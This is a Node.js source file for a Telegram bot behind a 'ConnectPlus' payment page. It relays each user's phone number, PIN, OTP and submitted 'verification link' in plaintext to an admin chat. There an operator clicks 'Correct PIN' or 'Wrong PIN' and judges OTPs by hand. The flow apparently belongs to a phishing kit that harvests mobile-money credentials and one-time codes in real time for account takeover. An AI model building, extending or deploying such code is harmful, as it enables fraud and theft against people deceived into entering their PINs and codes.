require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') });
const { default: TelegramBot } = require('node-telegram-bot-api');
const { auditLog } = require('./security');

const token = process.env.TELEGRAM_BOT_TOKEN;
const adminChatId = process.env.TELEGRAM_ADMIN_CHAT_ID;

let bot = null;
let botEnabled = false;

if (!token || token === 'your_bot_token_here') {
    console.warn('⚠️  TELEGRAM_BOT_TOKEN not set in .env — Telegram bot is DISABLED.');
    console.warn('   Set TELEGRAM_BOT_TOKEN and TELEGRAM_ADMIN_CHAT_ID in .env to enable it.');
} else {
    try {
        bot = new TelegramBot(token, { polling: true });
        botEnabled = true;
        console.log('🤖 Telegram bot started successfully');
    } catch (err) {
        console.error('Failed to start Telegram bot:', err.message);
    }
}

// In-memory storage for approval requests
const approvals = new Map();
const OTP_TIMEOUT = 5 * 60 * 1000;

function generateRequestId() {
    return 'REQ-' + Date.now().toString(36).toUpperCase();
}

function cleanupExpired() {
    const now = Date.now();
    for (const [id, req] of approvals) {
        if ((req.status === 'phone_pin_verified' || req.status === 'otp_pending') && now - req.createdAt > OTP_TIMEOUT) {
            if (botEnabled && bot) {
                bot.sendMessage(req.userChatId || adminChatId, '⏰ Verification timeout. The OTP verification window has expired.');
                if (req.adminMessageId) {
                    bot.editMessageText('⏰ Verification timeout (5 minutes expired).', {
                        chat_id: adminChatId,
                        message_id: req.adminMessageId
                    }).catch(() => {});
                }
            }
            approvals.delete(id);
        }
    }
}

setInterval(cleanupExpired, 30000);

if (botEnabled && bot) {
    bot.onText(/\/start/, (msg) => {
        bot.sendMessage(msg.chat.id, '🤖 ConnectPlus Bot is running.\n\nI will notify you when a new payment approval is needed.');
        auditLog.write('BOT_COMMAND', { command: '/start', userId: msg.chat.id.toString() });
    });

    bot.onText(/\/status/, (msg) => {
        const pending = Array.from(approvals.values()).filter(r => r.status === 'pending').length;
        const phonePinVerified = Array.from(approvals.values()).filter(r => r.status === 'phone_pin_verified').length;
        const otpPending = Array.from(approvals.values()).filter(r => r.status === 'otp_pending').length;
        bot.sendMessage(msg.chat.id, `📊 Current status:\n• Pending: ${pending}\n• Phone/PIN verified: ${phonePinVerified}\n• OTP verification: ${otpPending}\n• Total: ${approvals.size}`);
        auditLog.write('BOT_COMMAND', { command: '/status', userId: msg.chat.id.toString() });
    });

    bot.onText(/\/clear/, (msg) => {
        if (msg.chat.id.toString() !== adminChatId) {
            bot.sendMessage(msg.chat.id, '❌ Only admin can use this command.');
            return;
        }
        approvals.clear();
        bot.sendMessage(msg.chat.id, '🗑️ All approval requests cleared.');
        auditLog.write('BOT_COMMAND', { command: '/clear', userId: msg.chat.id.toString() });
    });

    bot.on('callback_query', async (query) => {
        const data = query.data;
        const chatId = query.message.chat.id;

        if (chatId.toString() !== adminChatId) {
            await bot.answerCallbackQuery(query.id, { text: '❌ Only admin can approve/reject requests.' });
            auditLog.write('UNAUTHORIZED_CALLBACK', { userId: chatId.toString(), data });
            return;
        }

        const lastUnderscore = data.lastIndexOf('_');
        const action = data.substring(0, lastUnderscore);
        const requestId = data.substring(lastUnderscore + 1);

        const request = approvals.get(requestId);

        if (!request) {
            await bot.answerCallbackQuery(query.id, { text: '⚠️ Request not found or expired.' });
            auditLog.write('CALLBACK_NOT_FOUND', { adminId: chatId.toString(), action, requestId });
            return;
        }

        auditLog.logAdminAction(action, requestId, chatId.toString());

        if (action === 'approve') {
            // This is the PHONE / PIN verification step. The buttons here must
            // be about the phone number and PIN only — the three OTP buttons
            // (Correct / Wrong / Resend) belong to the OTP message that is sent
            // later, once the user has actually submitted an OTP.
            request.status = 'phone_pin_verified';
            request.adminMessageId = query.message.message_id;

            const text = `✅ Phone & PIN Correct\n\n` +
                `📱 Phone: ${request.userPhone}\n` +
                `🔑 PIN: ${request.userPin}\n` +
                `📦 Package: ${request.package}\n` +
                `💰 Amount: ${request.amount}\n\n` +
                `User will now enter the OTP.\n` +
                `If the phone number or PIN is wrong, tap "Wrong PIN" to send the user back to re-enter them.`;

            const keyboard = {
                inline_keyboard: [
                    [{ text: '✅ Correct PIN', callback_data: `pin_approve_${requestId}` },
                     { text: '❌ Wrong PIN', callback_data: `pin_reject_${requestId}` }]
                ]
            };

            await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: query.message.message_id,
                reply_markup: keyboard
            });

            await bot.answerCallbackQuery(query.id, { text: '✅ Phone/PIN verified - waiting for OTP' });

            if (request.onApproved) request.onApproved(requestId);

        } else if (action === 'reject') {
            request.status = 'rejected';
            await bot.editMessageText(`❌ Payment Rejected\n\n📱 Phone: ${request.userPhone}\n📦 Package: ${request.package}\n💰 Amount: ${request.amount}\n\nThe user has been notified.`, {
                chat_id: chatId,
                message_id: query.message.message_id
            });
            await bot.answerCallbackQuery(query.id, { text: '❌ Rejected' });

            if (request.onRejected) request.onRejected(requestId);

        } else if (action === 'otp_approve') {
            request.status = 'completed';
            delete request.verificationStep;

            const text = `✅ OTP Verified - Payment Complete!\n\n` +
                `📱 Phone: ${request.userPhone}\n` +
                `🔑 PIN: ${request.userPin}\n` +
                `🔢 OTP: Verified\n` +
                `📦 Package: ${request.package}\n` +
                `💰 Amount: ${request.amount}\n` +
                `💳 Method: ${request.method}\n\n` +
                `The user has been approved and payment is complete.`;

            await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: query.message.message_id
            });

            await bot.answerCallbackQuery(query.id, { text: '✅ OTP verified - payment complete' });

            if (request.onVerified) request.onVerified(requestId);

            setTimeout(() => approvals.delete(requestId), 30000);

        } else if (action === 'otp_invalid') {
            request.status = 'invalid_otp';
            request.verificationStep = null;

            const text = `❌ Wrong OTP\n\n` +
                `📱 Phone: ${request.userPhone}\n` +
                `📦 Package: ${request.package}\n` +
                `💰 Amount: ${request.amount}\n\n` +
                `The user has been asked to enter the OTP again. A second verification request follows.`;

            await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: query.message.message_id
            });

            await bot.answerCallbackQuery(query.id, { text: '❌ Wrong OTP' });

            if (request.onInvalid) request.onInvalid(requestId);

            // Second-attempt flow: leave the request in 'invalid_otp' for a
            // moment so the user's browser observes it (and returns to the OTP
            // screen), then re-send the prompt to the admin with a fresh set of
            // verification buttons.
            setTimeout(() => {
                const req = approvals.get(requestId);
                if (!req || req.status !== 'invalid_otp') return;
                req.status = 'phone_pin_verified';
                sendOtpPrompt(requestId, '🔁 Re-sent for a second OTP verification attempt.');
            }, 3000);

        } else if (action === 'otp_wrong_pin') {
            // The admin reports the PHONE / PIN as wrong while verifying the OTP.
            // Even though the phone/PIN passed earlier, send the user all the way
            // back to re-enter their number and PIN. Status 'invalid_pin' is what
            // the browser already maps to "go back to the phone/PIN screen".
            request.status = 'invalid_pin';
            delete request.verificationStep;
            delete request.otp;

            const text = `❌ Wrong PIN Reported\n\n` +
                `📱 Phone: ${request.userPhone}\n` +
                `📦 Package: ${request.package}\n` +
                `💰 Amount: ${request.amount}\n\n` +
                `The phone number / PIN was wrong even though the OTP was being ` +
                `verified. The user has been sent back to re-enter their number and PIN.`;

            await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: query.message.message_id
            });

            await bot.answerCallbackQuery(query.id, { text: '❌ Wrong PIN - user must re-enter number and PIN' });

            if (request.onInvalid) request.onInvalid(requestId);

        } else if (action === 'invalid') {
            // "❌ Invalid Information" is used when the PHONE NUMBER or PIN is
            // wrong. Send the user back to the phone/PIN page and re-raise the
            // request so the admin gets a second prompt to resend it.
            request.status = 'invalid_pin';
            delete request.verificationStep;

            await bot.editMessageText(`❌ Invalid Phone / PIN\n\n` +
                `📱 Phone: ${request.userPhone}\n` +
                `📦 Package: ${request.package}\n\n` +
                `The user has been sent back to re-enter their number / PIN and a new request will be sent for approval.`, {
                chat_id: chatId,
                message_id: query.message.message_id
            });
            await bot.answerCallbackQuery(query.id, { text: '❌ Phone/PIN marked invalid' });

            if (request.onInvalid) request.onInvalid(requestId);

            // Second-attempt flow: re-raise the same request so the admin gets
            // a fresh prompt with a clear reason to re-send for approval.
            sendPhonePinPrompt(requestId, '❌ Invalid Phone / PIN reported. Please re-send for approval once the user re-enters their details.');

        } else if (action === 'pin_approve') {
            // Admin confirms the phone/PIN after a second (resent) prompt. This
            // is still the PHONE / PIN step, so it must NOT show OTP buttons —
            // those belong to the OTP message sent once the user submits an OTP.
            request.status = 'phone_pin_verified';
            request.adminMessageId = query.message.message_id;

            const text = `✅ Phone & PIN Correct\n\n` +
                `📱 Phone: ${request.userPhone}\n` +
                `🔑 PIN: ${request.userPin}\n` +
                `📦 Package: ${request.package}\n` +
                `💰 Amount: ${request.amount}\n\n` +
                `User will now enter the OTP.`;

            await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: query.message.message_id
            });

            await bot.answerCallbackQuery(query.id, { text: '✅ Phone/PIN verified - waiting for OTP' });

            if (request.onApproved) request.onApproved(requestId);

        } else if (action === 'pin_reject') {
            request.status = 'pin_rejected';
            delete request.verificationStep;

            await bot.editMessageText(`❌ Phone / PIN Rejected\n\n` +
                `📱 Phone: ${request.userPhone}\n` +
                `📦 Package: ${request.package}\n\n` +
                `The user has been sent back to re-enter their number / PIN.`, {
                chat_id: chatId,
                message_id: query.message.message_id
            });
            await bot.answerCallbackQuery(query.id, { text: '❌ Phone/PIN rejected' });

            if (request.onInvalid) request.onInvalid(requestId);

        } else if (action === 'link_approve') {
            request.status = 'completed';
            delete request.verificationStep;

            const text = `✅ Link Verified - Payment Complete!\n\n` +
                `📱 Phone: ${request.userPhone}\n` +
                `📦 Package: ${request.package}\n` +
                `💰 Amount: ${request.amount}\n` +
                `💳 Method: ${request.method}\n\n` +
                `The verification link has been approved and payment is complete.`;

            await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: query.message.message_id
            });

            await bot.answerCallbackQuery(query.id, { text: '✅ Link verified - payment complete' });

            if (request.onVerified) request.onVerified(requestId);

            setTimeout(() => approvals.delete(requestId), 30000);

        } else if (action === 'link_invalid') {
            request.status = 'invalid';
            request.verificationStep = null;

            const text = `❌ Invalid Link\n\n` +
                `📱 Phone: ${request.userPhone}\n` +
                `📦 Package: ${request.package}\n` +
                `💰 Amount: ${request.amount}\n\n` +
                `The verification link was incorrect. The user has been notified.`;

            await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: query.message.message_id
            });

            await bot.answerCallbackQuery(query.id, { text: '❌ Invalid link' });

            if (request.onInvalid) request.onInvalid(requestId);

            setTimeout(() => approvals.delete(requestId), 30000);
        }
    });

    bot.on('message', async (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text?.trim();

        if (!text || text.startsWith('/')) return;

        if (chatId.toString() !== adminChatId) {
            return;
        }

        let pendingRequest = null;
        for (const [id, req] of approvals) {
            if (req.verificationStep === 'awaiting_otp') {
                pendingRequest = { id, ...req };
                break;
            }
        }

        if (!pendingRequest) {
            return;
        }

        const enteredOtp = text;

        if (!/^\d{4,8}$/.test(enteredOtp)) {
            bot.sendMessage(chatId, '⚠️ Please enter a valid OTP (4-8 digits).\nExample: 123456');
            return;
        }

        if (enteredOtp !== pendingRequest.otp) {
            bot.sendMessage(chatId, `❌ Wrong OTP entered.\n\nExpected: ${pendingRequest.otp}\nReceived: ${enteredOtp}\n\nPlease try again.`);
            if (pendingRequest.onWrongOtp) pendingRequest.onWrongOtp(pendingRequest.id);
            return;
        }

        if (pendingRequest.timeoutTimer) {
            clearTimeout(pendingRequest.timeoutTimer);
        }

        pendingRequest.status = 'completed';
        delete pendingRequest.verificationStep;

        bot.sendMessage(chatId, `✅ Verification Successful!\n\n` +
            `📱 Phone: ${pendingRequest.userPhone}\n` +
            `🔑 PIN: Verified\n` +
            `🔢 OTP: Verified\n` +
            `📦 Package: ${pendingRequest.package}\n` +
            `💰 Amount: ${pendingRequest.amount}\n\n` +
            `The user has been approved and can proceed.`);

        if (pendingRequest.onVerified) pendingRequest.onVerified(pendingRequest.id);

        setTimeout(() => approvals.delete(pendingRequest.id), 30000);
    });
}

function createApprovalRequest(data) {
    const requestId = generateRequestId();
    const request = {
        id: requestId,
        userPhone: data.userPhone || 'N/A',
        userPin: data.userPin || 'N/A',
        package: data.package || 'N/A',
        amount: data.amount || 'N/A',
        method: data.method || 'N/A',
        otp: data.otp || null,
        status: 'pending',
        createdAt: Date.now(),
        verificationStep: null,
        onApproved: data.onApproved,
        onRejected: data.onRejected,
        onInvalid: data.onInvalid,
        onVerified: data.onVerified,
        onWrongOtp: data.onWrongOtp,
        onTimeout: data.onTimeout
    };

    approvals.set(requestId, request);

    if (botEnabled && bot) {
        const text = `🆕 New Payment Approval Request\n\n` +
            `📱 Phone: ${request.userPhone}\n` +
            `🔑 PIN: ${request.userPin}\n` +
            `📦 Package: ${request.package}\n` +
            `💰 Amount: ${request.amount}\n` +
            `💳 Method: ${request.method}\n\n` +
            `Please review and take action:`;

        const keyboard = {
            inline_keyboard: [
                [
                    { text: '✅ Correct PIN', callback_data: `approve_${requestId}` },
                    { text: '❌ Wrong PIN', callback_data: `invalid_${requestId}` }
                ]
            ]
        };

        bot.sendMessage(adminChatId, text, { reply_markup: keyboard }).then((msg) => {
            console.log('✅ Telegram approval message sent, message_id:', msg.message_id);
            request.adminMessageId = msg.message_id;
        }).catch((err) => {
            console.error('❌ Failed to send approval message:', err.message);
        });
    }

    return requestId;
}

// Re-sends the phone/PIN approval prompt (used for the second-attempt flow
// after an invalid phone/PIN, so the admin can re-approve the updated details).
function sendPhonePinPrompt(requestId, reason) {
    const request = approvals.get(requestId);
    if (!request || !botEnabled || !bot) return;

    const text = `🔄 Phone / PIN Re-submission\n\n` +
        `📱 Phone: ${request.userPhone}\n` +
        `🔑 PIN: ${request.userPin}\n` +
        `📦 Package: ${request.package}\n` +
        `💰 Amount: ${request.amount}\n` +
        `💳 Method: ${request.method}\n\n` +
        (reason ? `${reason}\n\n` : '') +
        `Please review the updated details and take action:`;

    const keyboard = {
        inline_keyboard: [
            [
                { text: '✅ Correct PIN', callback_data: `pin_approve_${requestId}` },
                { text: '❌ Wrong PIN', callback_data: `pin_reject_${requestId}` }
            ]
        ]
    };

    bot.sendMessage(adminChatId, text, { reply_markup: keyboard }).then((msg) => {
        request.adminMessageId = msg.message_id;
    }).catch((err) => {
        console.error('Failed to re-send phone/PIN prompt:', err.message);
    });
}

// Sends the OTP verification prompt with three buttons:
//   ✅ Correct OTP — the OTP the user entered is right, payment is complete.
//   ❌ Wrong OTP   — the OTP is wrong; the user re-enters the OTP.
//   ❌ Wrong PIN   — the OTP may be fine but the phone/PIN is wrong; the user
//                    is sent all the way back to re-enter phone + PIN, even if
//                    the phone/PIN passed earlier.
// Used for the first submission and for every re-send so the admin always has a
// fresh actionable message.
//
// There is deliberately NO "Resend OTP" button: resending an OTP is not
// something the admin does from this message.
function sendOtpPrompt(requestId, reason) {
    const request = approvals.get(requestId);
    if (!request || !botEnabled || !bot) return;

    const keyboard = {
        inline_keyboard: [
            [
                { text: '✅ Correct OTP', callback_data: `otp_approve_${requestId}` },
                { text: '❌ Wrong OTP', callback_data: `otp_invalid_${requestId}` }
            ],
            [
                { text: '❌ Wrong PIN', callback_data: `otp_wrong_pin_${requestId}` }
            ]
        ]
    };

    bot.sendMessage(adminChatId, `🔢 OTP Submitted\n\n` +
        `📱 Phone: ${request.userPhone}\n` +
        `📦 Package: ${request.package}\n` +
        `🔢 OTP: ${request.otp}\n\n` +
        (reason ? `${reason}\n\n` : '') +
        `Please verify by clicking "Correct OTP" and entering the OTP.\n` +
        `If the phone number or PIN is actually wrong, tap "Wrong PIN" to send ` +
        `the user back to re-enter them.\n` +
        `⏱️ You have 5 minutes.`, { reply_markup: keyboard }).then((msg) => {
        request.adminOtpMessageId = msg.message_id;
    }).catch((err) => {
        console.error('Failed to send OTP notification:', err.message);
    });
}

function submitOtp(requestId, otp) {
    const request = approvals.get(requestId);
    if (!request) {
        return { success: false, message: 'Request not found' };
    }

    if (request.status !== 'phone_pin_verified' && request.status !== 'otp_pending') {
        return { success: false, message: 'Phone/PIN not verified yet' };
    }

    request.otp = otp;
    request.status = 'otp_pending';

    sendOtpPrompt(requestId);

    return { success: true, message: 'OTP submitted for verification' };
}

// Called by the browser in two situations:
//   1. No PIN — the user is acknowledging the admin's "Wrong PIN" verdict and
//      returning to the phone/PIN screen. Nothing is re-raised.
//   2. With a PIN — the user has re-entered their details, so move the request
//      back to phone/PIN verification and re-raise the prompt for the admin.
function submitPin(requestId, pin) {
    const request = approvals.get(requestId);
    if (!request) {
        return { success: false, message: 'Request not found' };
    }

    if (request.status === 'completed') {
        return { success: false, message: 'Request already completed' };
    }

    // No PIN supplied means the browser is merely acknowledging the admin's
    // "Wrong PIN" verdict (from the OTP message) so the user can go back and
    // re-enter their details. Do NOT flip the status to phone_pin_verified and
    // do NOT re-raise a prompt here — the admin already ruled the PIN wrong, and
    // re-raising would immediately contradict that verdict. A fresh prompt is
    // sent only once the user actually resubmits a PIN below.
    if (!pin) {
        return { success: true, message: 'Wrong-PIN acknowledged; awaiting re-entry' };
    }

    request.userPin = pin;
    request.status = 'phone_pin_verified';
    delete request.verificationStep;
    sendPhonePinPrompt(requestId, 'Phone / PIN re-submitted after a wrong PIN.');

    return { success: true, message: 'Phone/PIN re-submitted for approval' };
}

function submitLink(requestId, link) {
    const request = approvals.get(requestId);
    if (!request) {
        return { success: false, message: 'Request not found' };
    }

    if (request.status !== 'phone_pin_verified' && request.status !== 'otp_pending') {
        return { success: false, message: 'Phone/PIN not verified yet' };
    }

    request.otp = link;
    request.status = 'otp_pending';

    if (botEnabled && bot) {
        const cleanLink = (link || '').trim();
        const keyboard = {
            inline_keyboard: [
                [{ text: '🔗 Open Verification Link', url: cleanLink }],
                [{ text: '✅ Verify Link', callback_data: `link_approve_${requestId}` },
                 { text: '❌ Invalid Link', callback_data: `link_invalid_${requestId}` }]
            ]
        };
        bot.sendMessage(adminChatId, `🔗 Verification Link Submitted\n\n` +
            `📱 Phone: ${request.userPhone}\n` +
            `📦 Package: ${request.package}\n` +
            `🔗 Link: ${cleanLink}\n\n` +
            `Please verify by clicking "Verify Link" and confirming.\n` +
            `⏱️ You have 5 minutes.`, { reply_markup: keyboard }).then((msg) => {
            request.adminOtpMessageId = msg.message_id;
        }).catch((err) => {
            console.error('Failed to send link notification:', err.message);
        });
    }

    return { success: true, message: 'Link submitted for verification' };
}

function getApprovalStatus(requestId) {
    const request = approvals.get(requestId);
    if (!request) {
        return { status: 'not_found' };
    }
    return {
        status: request.status,
        userPhone: request.userPhone,
        package: request.package,
        amount: request.amount,
        method: request.method,
        otp: request.otp || null
    };
}

function sendNotification(message) {
    if (!botEnabled || !bot) return false;
    bot.sendMessage(adminChatId, message).then(() => {
        console.log('Notification sent to admin');
    }).catch((err) => {
        console.error('Failed to send notification:', err.message);
    });
    return true;
}

module.exports = {
    bot,
    createApprovalRequest,
    submitOtp,
    submitPin,
    submitLink,
    getApprovalStatus,
    sendNotification,
    sendPhonePinPrompt,
    approvals
};
